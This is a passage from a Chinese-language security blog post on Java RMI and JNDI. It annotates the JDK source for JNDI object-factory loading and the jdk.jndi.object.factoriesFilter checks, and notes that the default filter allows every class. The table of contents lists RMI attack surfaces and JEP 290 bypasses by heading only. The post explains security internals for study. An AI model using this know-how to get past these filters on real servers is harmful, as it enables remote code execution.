<p>新版 JNDI 的 <code>NamingManager#getObjectFactoryFromReference</code> 做了 <strong>先无初始化加载 → 立刻按白名单过滤</strong>，同时引入 <strong>全局 + 协议级</strong> 两层“工厂类过滤器”属性，默认更偏向只信任 <strong>JDK 自带 Provider 的工厂类</strong>；想让第三方工厂介入，必须显式放行。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据引用（Reference）对象中指定的工厂类名和工厂代码库（codebase），</span></span><br><span class="line"><span class="comment"> * 尝试加载并返回对应的 ObjectFactory。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ref         非空的 Reference 对象，用于提供工厂类名和可能的 codebase。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factoryName 工厂类的非空类名（全限定类名）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回能够实例化出的 ObjectFactory；若加载失败或被安全过滤器拦截，则返回 null。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalAccessException    如果类或其构造方法不可访问。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InstantiationException    如果类是抽象类，接口，或者没有无参构造方法。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException     如果提供的 codebase 不是合法的 URL。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">    InstantiationException,</span><br><span class="line">    MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一步：尝试用当前 ClassLoader 加载工厂类，但不触发静态初始化</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clas = helper.loadClassWithoutInit(factoryName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 📌 使用 ObjectFactoriesFilter 校验该工厂类是否允许被实例化</span></span><br><span class="line">        <span class="keyword">if</span> (!ObjectFactoriesFilter.canInstantiateObjectsFactory(clas)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 若不允许，直接返回 null</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// 如果类在当前 classpath 找不到，忽略异常，继续尝试后续逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其它异常（如安全异常、访问异常）会直接抛出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二步：如果当前 classpath 中没找到，并且 Reference 里指定了 codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 从指定的 codebase（URL）加载工厂类</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 📌 仍需校验该类是否符合安全过滤器要求</span></span><br><span class="line">            <span class="keyword">if</span> (clas == <span class="literal">null</span> ||</span><br><span class="line">                !ObjectFactoriesFilter.canInstantiateObjectsFactory(clas)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 不合法就拒绝</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 依旧忽略，不处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 📌 第三步：若最终成功加载到类，则调用 newInstance() 实例化并返回 ObjectFactory</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在本地类加载的分支中，<code>com.sun.naming.internal.VersionHelper12#loadClassWithoutInit</code> 在调用 <code>loadClass</code> 加载类的时候显式指定不初始化类，防止触发类中的静态代码块的执行。（远程类加载由于有 <code>trustURLCodebase</code> 检测，因此没有这方面的设置）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据类名加载类，但不触发类的初始化。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className 类的全限定名（例如 &quot;java.util.HashMap&quot;）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回加载到的 Class 对象。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 如果找不到指定的类。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClassWithoutInit(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 调用重载的 loadClass 方法：</span></span><br><span class="line">    <span class="comment">// 参数含义：</span></span><br><span class="line">    <span class="comment">//   - className: 要加载的类名</span></span><br><span class="line">    <span class="comment">//   - false: 表示“不要初始化类”（即不执行静态代码块、静态字段赋值等初始化动作）</span></span><br><span class="line">    <span class="comment">//   - getContextClassLoader(): 使用当前线程的上下文类加载器进行加载</span></span><br><span class="line">    <span class="keyword">return</span> loadClass(className, <span class="literal">false</span>, getContextClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外就是调用类的无参构造函数实例化之前，会调用 <code>com.sun.naming.internal.ObjectFactoriesFilterObjectFactoriesFilter#canInstantiateObjectsFactory</code> 进行过滤。</p>
<p><code>canInstantiateObjectsFactory</code> 实际上是通过调用 <code>checkInput</code> 进行过滤的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查系统/安全属性 &quot;jdk.jndi.object.factoriesFilter&quot; 构造出来的过滤器，</span></span><br><span class="line"><span class="comment"> * 是否允许实例化指定的工厂类（factoryClass）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 只要过滤结果不是 REJECTED（被拒绝），就视为允许。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">canInstantiateObjectsFactory</span><span class="params">(Class&lt;?&gt; factoryClass)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> checkInput(() -&gt; factoryClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>checkInput</code> 调用全局过滤器 <code>GLOBAL</code> 的 <code>checkInput</code> 方法进行过滤。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用全局过滤器检查。只要不是 REJECTED 就放行（true）。</span></span><br><span class="line"><span class="comment"> * 注意：UNDECIDED（未匹配）也会被当成“允许”！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkInput</span><span class="params">(FactoryInfo factoryInfo)</span> &#123;</span><br><span class="line">    <span class="type">Status</span> <span class="variable">result</span> <span class="operator">=</span> GLOBAL.checkInput(factoryInfo);</span><br><span class="line">    <span class="keyword">return</span> result != Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>全局过滤器有限使用 <code>SecurityProperties.privilegedGetOverridable</code> 创建，如果无法创建则设置为默认值 <code>DEFAULT_SP_VALUE</code>，即允许所有类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 系统/安全属性名：配置“允许/拒绝 哪些工厂类”的模式串（与 jdk.serialFilter 同语法）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FACTORIES_FILTER_PROPNAME</span> <span class="operator">=</span> <span class="string">&quot;jdk.jndi.object.factoriesFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认值：&quot;*&quot; —— 前缀通配，等价于“允许所有类”</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_SP_VALUE</span> <span class="operator">=</span> <span class="string">&quot;*&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程级（类初始化时构造）的全局过滤器：只解析一次，static final 表示运行期改属性也不会自动生效</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ObjectInputFilter</span> <span class="variable">GLOBAL</span> <span class="operator">=</span></span><br><span class="line">        ObjectInputFilter.Config.createFilter(getFilterPropertyValue());</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取过滤规则字符串：</span></span><br><span class="line"><span class="comment"> * - 优先取系统属性（-D），否则取 java.security 安全属性；</span></span><br><span class="line"><span class="comment"> * - 都没有则返回默认值 &quot;*&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getFilterPropertyValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">propVal</span> <span class="operator">=</span> SecurityProperties.privilegedGetOverridable(FACTORIES_FILTER_PROPNAME);</span><br><span class="line">    <span class="keyword">return</span> propVal != <span class="literal">null</span> ? propVal : DEFAULT_SP_VALUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>privilegedGetOverridable</code> 会分别从安全管理器（<code>SecurityManager</code>）和系统属性中读取 <code>FACTORIES_FILTER_PROPNAME</code> 即 <code>jdk.jndi.object.factoriesFilter</code> 的配置，由于我们默认没有设置，因此最终是<strong>按照默认的全部放行处理的</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回安全属性 `propName` 的值，该值可以被同名的系统属性覆盖</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  propName 系统属性或安全属性的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 对应的属性值（如果系统属性存在，则优先返回系统属性；否则返回安全属性）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">privilegedGetOverridable</span><span class="params">(String propName)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果当前没有安装 SecurityManager（即安全管理器为 null）</span></span><br><span class="line">    <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 直接去获取系统属性/安全属性</span></span><br><span class="line">        <span class="keyword">return</span> getOverridableProperty(propName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果存在 SecurityManager，则必须在特权上下文中执行</span></span><br><span class="line">        <span class="comment">// 使用 AccessController.doPrivileged 包装，避免安全检查失败</span></span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(</span><br><span class="line">            (PrivilegedAction&lt;String&gt;) () -&gt; getOverridableProperty(propName)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getOverridableProperty</span><span class="params">(String propName)</span> &#123;</span><br><span class="line">    <span class="comment">// 先从系统属性（System property）中获取值</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">val</span> <span class="operator">=</span> System.getProperty(propName);</span><br><span class="line">    <span class="keyword">if</span> (val == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果系统属性中没有，再去安全属性（Security property）里找</span></span><br><span class="line">        <span class="keyword">return</span> Security.getProperty(propName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果系统属性存在，则优先返回系统属性的值</span></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <strong>JDK 20&#x2F;21</strong> 时代又新增<strong>协议粒度</strong>的属性：**<code>jdk.jndi.ldap.object.factoriesFilter</code><strong>、</strong><code>jdk.jndi.rmi.object.factoriesFilter</code>**，用于分别限制来自 LDAP &#x2F; RMI 的引用恢复（默认更严格，只允许 JDK 自带模块的工厂）。</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java RMI &amp; JNDI</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-08-25 01:06:24</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-10-08 00:28:40
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/08/25/Java RMI &amp; JNDI/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/09/09/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java 反序列化</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/19/Unicorn%20%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Unicorn 使用总结</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java RMI &amp; JNDI</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%EF%BC%88Remote-Method-Invocation%EF%BC%89"><span class="nav-text">RMI（Remote Method Invocation）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E7%9A%84%E4%B8%BB%E8%A6%81%E7%BB%84%E4%BB%B6"><span class="nav-text">RMI的主要组件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A5%E5%8F%A3%EF%BC%88Remote-Interface%EF%BC%89"><span class="nav-text">远程接口（Remote Interface）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E7%B1%BB%EF%BC%88Remote-Object-Implementation%EF%BC%89"><span class="nav-text">远程对象实现类（Remote Object Implementation）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E6%A0%B9%EF%BC%88Stub%EF%BC%89%E5%92%8C%E9%AA%A8%E6%9E%B6%EF%BC%88Skeleton%EF%BC%89"><span class="nav-text">存根（Stub）和骨架（Skeleton）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%EF%BC%88RMI-Registry%EF%BC%89"><span class="nav-text">RMI 注册中心（RMI Registry）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8-RMI-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="nav-text">启动 RMI 注册中心</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B3%A8%E5%86%8C%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">服务端注册远程对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">客户端查找远程对象</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-text">RMI 工作流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C"><span class="nav-text">服务注册</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA"><span class="nav-text">远程对象创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%88%9B%E5%BB%BA"><span class="nav-text">注册中心创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%86%8C"><span class="nav-text">远程对象注册</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">服务发现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%83%A8%E5%88%86"><span class="nav-text">客户端&#x2F;服务端部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E9%83%A8%E5%88%86"><span class="nav-text">注册中心部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8"><span class="nav-text">服务调用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%83%A8%E5%88%86"><span class="nav-text">客户端部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%83%A8%E5%88%86"><span class="nav-text">服务端部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DGC"><span class="nav-text">DGC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DGC-%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">DGC 初始化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%83%A8%E5%88%86-1"><span class="nav-text">客户端部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%83%A8%E5%88%86-1"><span class="nav-text">服务端部分</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">RMI 攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%886u45-7u21-%E5%89%8D%EF%BC%89"><span class="nav-text">远程类加载（6u45&#x2F;7u21 前）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="nav-text">代码示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%88%E6%97%A0%E9%99%90%E5%88%B6%EF%BC%89"><span class="nav-text">攻击服务端（无限制）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%EF%BC%888u121%E3%80%817u131%E3%80%816u141-%E5%89%8D%EF%BC%89"><span class="nav-text">攻击注册中心（8u121、7u131、6u141 前）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%88%E6%97%A0%E9%99%90%E5%88%B6%EF%BC%89"><span class="nav-text">攻击客户端（无限制）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BBDGC"><span class="nav-text">攻击DGC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JEP290-%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-text">JEP290 检测与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-%E4%B8%AD%E7%9A%84-JEP290-%E8%BF%87%E6%BB%A4"><span class="nav-text">RMI 中的 JEP290 过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">远程对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="nav-text">注册中心</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DGC-1"><span class="nav-text">DGC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JEP-290-%E7%BB%95%E8%BF%87"><span class="nav-text">JEP 290 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">普通远程对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">客户端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83-1"><span class="nav-text">注册中心</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#JRMP-%E5%9B%9E%E8%BF%9E%E8%AF%B1%E5%AF%BC%EF%BC%88%E6%9C%AC%E5%9C%B0%EF%BC%89"><span class="nav-text">JRMP 回连诱导（本地）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0-lookup-%E8%B0%83%E7%94%A8%EF%BC%888u231-%E5%89%8D%EF%BC%89"><span class="nav-text">伪造 lookup 调用（8u231 前）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UnicastRemoteObject-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%888u241-%E5%89%8D%EF%BC%89"><span class="nav-text">UnicastRemoteObject 反序列化（8u241 前）</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%EF%BC%88Java-Naming-and-Directory-Interface%EF%BC%89"><span class="nav-text">JNDI（Java Naming and Directory 